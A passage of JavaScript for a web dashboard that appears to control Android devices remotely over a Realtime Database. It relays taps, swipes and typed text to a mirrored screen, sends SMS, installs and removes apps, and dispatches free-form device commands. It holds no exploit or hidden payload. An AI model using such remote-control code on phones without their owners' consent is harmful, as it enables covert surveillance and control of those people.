        return renderPhoneScreen();
      }

      const toggleAppId = target.getAttribute('data-toggle-app');
      if (toggleAppId) {
        const a = state.apps.find((item) => item.id === toggleAppId);
        if (a) return toggleAppEnabled(a);
      }

      const uninstallAppId = target.getAttribute('data-uninstall-app');
      if (uninstallAppId) {
        const a = state.apps.find((item) => item.id === uninstallAppId);
        if (a) return uninstallAppEntry(a);
      }
    });

    let screenPointerStart = null;
    let swipeRafId = null;
    let latestMoveEvent = null;

    const flushSwipeMoveFrame = () => {
      swipeRafId = null;
      if (!screenPointerStart || !latestMoveEvent) return;
      const start = screenPointerStart;
      const ev = latestMoveEvent;
      const dx = ev.clientX - start.clientX;
      const dy = ev.clientY - start.clientY;
      const dist = Math.hypot(dx, dy);
      if (dist < 8 && state.screenControlMode !== 'swipe') return;

      const rect = start.rect;
      const clamp01 = (v) => Math.max(0, Math.min(1, v));
      const endXPct = clamp01((ev.clientX - rect.left) / rect.width);
      const endYPct = clamp01((ev.clientY - rect.top) / rect.height);

      state.swipeTrail = {
        startXPercent: start.startXPct,
        startYPercent: start.startYPct,
        endXPercent: Number(endXPct.toFixed(4)),
        endYPercent: Number(endYPct.toFixed(4)),
        startX: Math.round(start.startXPct * start.targetWidth),
        startY: Math.round(start.startYPct * start.targetHeight),
        endX: Math.round(endXPct * start.targetWidth),
        endY: Math.round(endYPct * start.targetHeight),
        active: true,
        at: start.at,
      };
      renderSwipeTrailLayer(state.swipeTrail);
    };

    viewport.addEventListener('pointerdown', (e) => {
      const stage = e.target.closest('#remote-screen-stage');
      if (!stage || !state.activeUid) return;
      const img = document.getElementById('remote-screen-image');
      const rect = (img || stage).getBoundingClientRect();
      if (!rect.width || !rect.height) return;

      try {
        stage.setPointerCapture(e.pointerId);
      } catch {
        // Ignore if pointer capture is unavailable
      }

      const clamp01 = (v) => Math.max(0, Math.min(1, v));
      const xPct = clamp01((e.clientX - rect.left) / rect.width);
      const yPct = clamp01((e.clientY - rect.top) / rect.height);
      const targetWidth = state.screenData?.width || img?.naturalWidth || 1080;
      const targetHeight = state.screenData?.height || img?.naturalHeight || 2400;
      const now = Date.now();

      if (state.markerClearTimer) {
        clearTimeout(state.markerClearTimer);
        state.markerClearTimer = null;
      }
      state.swipeTrail = null;
      state.lastTapMarker = {
        x: Math.round(xPct * targetWidth),
        y: Math.round(yPct * targetHeight),
        xPercent: Number(xPct.toFixed(4)),
        yPercent: Number(yPct.toFixed(4)),
        pressed: true,
        at: now,
      };
      renderTapDotLayer(state.lastTapMarker);

      screenPointerStart = {
        pointerId: e.pointerId,
        clientX: e.clientX,
        clientY: e.clientY,
        startXPct: Number(xPct.toFixed(4)),
        startYPct: Number(yPct.toFixed(4)),
        targetWidth,
        targetHeight,
        rect,
        at: now,
      };
    });

    viewport.addEventListener('pointermove', (e) => {
      if (!screenPointerStart || e.pointerId !== screenPointerStart.pointerId) return;
      latestMoveEvent = { clientX: e.clientX, clientY: e.clientY };
      if (!swipeRafId) {
        swipeRafId = requestAnimationFrame(flushSwipeMoveFrame);
      }
    });

    viewport.addEventListener('pointerup', (e) => {
      if (!screenPointerStart) return;
      const start = screenPointerStart;
      screenPointerStart = null;
      latestMoveEvent = null;
      if (swipeRafId) {
        cancelAnimationFrame(swipeRafId);
        swipeRafId = null;
      }

      const stage = document.getElementById('remote-screen-stage');
      if (!stage || !state.activeUid) return;
      try {
        if (stage.hasPointerCapture?.(e.pointerId)) {
          stage.releasePointerCapture(e.pointerId);
        }
      } catch {
        // Ignore
      }

      const img = document.getElementById('remote-screen-image');
      const rect = (img || stage).getBoundingClientRect();
      if (!rect.width || !rect.height) return;

      const targetWidth = state.screenData?.width || img?.naturalWidth || 1080;
      const targetHeight = state.screenData?.height || img?.naturalHeight || 2400;

      const clamp01 = (v) => Math.max(0, Math.min(1, v));
      const startXPct = clamp01((start.clientX - rect.left) / rect.width);
      const startYPct = clamp01((start.clientY - rect.top) / rect.height);
      const endXPct = clamp01((e.clientX - rect.left) / rect.width);
      const endYPct = clamp01((e.clientY - rect.top) / rect.height);

      const dx = e.clientX - start.clientX;
      const dy = e.clientY - start.clientY;
      const dist = Math.hypot(dx, dy);

      if (state.screenControlMode === 'swipe' || dist > 12) {
        const elapsedMs = Date.now() - start.at;
        const durationMs = Math.max(110, Math.min(420, elapsedMs));
        void sendScreenTapControl({
          action: 'swipe',
          startX: startXPct * targetWidth,
          startY: startYPct * targetHeight,
          endX: endXPct * targetWidth,
          endY: endYPct * targetHeight,
          startXPercent: startXPct,
          startYPercent: startYPct,
          endXPercent: endXPct,
          endYPercent: endYPct,
          durationMs,
          width: targetWidth,
          height: targetHeight,
        });
      } else {
        void sendScreenTapControl({
          action: 'tap',
          x: endXPct * targetWidth,
          y: endYPct * targetHeight,
          xPercent: endXPct,
          yPercent: endYPct,
          width: targetWidth,
          height: targetHeight,
        });
      }
    });

    viewport.addEventListener('pointercancel', () => {
      screenPointerStart = null;
      latestMoveEvent = null;
      if (swipeRafId) {
        cancelAnimationFrame(swipeRafId);
        swipeRafId = null;
      }
      clearScreenOverlayNow();
    });

    viewport.addEventListener('input', (e) => {
      const target = e.target;
      if (target.id === 'dialer-input') {
        state.dialNumber = target.value.slice(0, 32);
      } else if (target.id === 'input-contact-search') {
        state.contactSearch = target.value;
        renderPhoneScreen();
      } else if (target.id === 'input-app-search') {
        state.appSearch = target.value;
        renderPhoneScreen();
      }
    });

    viewport.addEventListener('change', async (e) => {
      const target = e.target;
      if (target.id === 'input-status-battery-range' && state.status) {
        const next = Math.max(0, Math.min(100, Math.round(Number(target.value) || 0)));
        await updateDeviceStatusFields({ batteryLevel: next });
        showPhoneToast('Battery Updated', `${next}%`);
      }
    });

    viewport.addEventListener('submit', async (e) => {
      e.preventDefault();
      const form = e.target;
      if (form.id === 'form-reply-sms') {
        const input = document.getElementById('input-sms-reply');
        if (!input || !state.activeThreadPhone) return;
        const body = input.value.trim();
        if (!body) return;
        input.value = '';
        await sendSmsMessage({
          senderName: '',
          phoneNumber: state.activeThreadPhone,
          body,
          direction: 'outbound',
        });
      } else if (form.id === 'form-new-sms') {
        const data = new FormData(form);
        await sendSmsMessage({
          senderName: data.get('senderName'),
          phoneNumber: data.get('phoneNumber'),
          body: data.get('body'),
          direction: 'outbound',
        });
        state.activeThreadPhone = cleanText(data.get('phoneNumber'), 32);
        state.showNewMessageForm = false;
        renderPhoneScreen();
      } else if (form.id === 'form-add-contact') {
        const data = new FormData(form);
        await addContactEntry({
          name: data.get('name'),
          phoneNumber: data.get('phoneNumber'),
          email: data.get('email'),
          company: data.get('company'),
        });
        state.showAddContactForm = false;
        renderPhoneScreen();
      } else if (form.id === 'form-install-app') {
        const data = new FormData(form);
        await installAppEntry({
          name: data.get('name'),
          packageName: data.get('packageName'),
          version: data.get('version'),
          sizeMb: data.get('sizeMb'),
          category: data.get('category'),
        });
        state.showInstallAppForm = false;
        renderPhoneScreen();
      } else if (form.id === 'form-phone-device-name') {
        const data = new FormData(form);
        await saveDeviceName(data.get('deviceName'));
      } else if (form.id === 'form-send-command') {
        const data = new FormData(form);
        await sendDeviceCommand({
          command: data.get('command'),
          target: data.get('target'),
          payload: data.get('payload'),
        });
        form.reset();
      } else if (form.id === 'form-status-update') {
        const data = new FormData(form);
        const fields = {
          deviceName: cleanText(data.get('deviceName'), 64) || state.activeUid,
          model: cleanText(data.get('model'), 64) || 'Android Device',
          osVersion: cleanText(data.get('osVersion'), 32) || 'Android 15',
          wifiName: cleanText(data.get('wifiName'), 64) || 'Wi-Fi',
          temperatureC: Number(data.get('temperatureC')) || 31.4,
          storageUsedGb: Math.max(0, Number(data.get('storageUsedGb')) || 0),
          storageTotalGb: Math.max(1, Number(data.get('storageTotalGb')) || 128),
          ramUsedGb: Math.max(0, Number(data.get('ramUsedGb')) || 0),
          ramTotalGb: Math.max(1, Number(data.get('ramTotalGb')) || 12),
          lastSeen: Date.now(),
        };
        await updateDeviceStatusFields(fields);
        showPhoneToast('Status Saved', `${fields.deviceName} synced to RTDB`);
      } else if (form.id === 'form-screen-send-msg') {
        const input = document.getElementById('input-screen-msg');
        const textVal = cleanText(input?.value || '', 500);
        if (!textVal) return;
        if (input) input.value = '';
        void sendScreenTapControl({ action: 'text', text: textVal });
      }
    });
  }
}

// --- Boot: Stage 1 (Device UID List First via Realtime Database) ---
wireStaticListeners();
updateClocks();
bootRtdbDirectory();
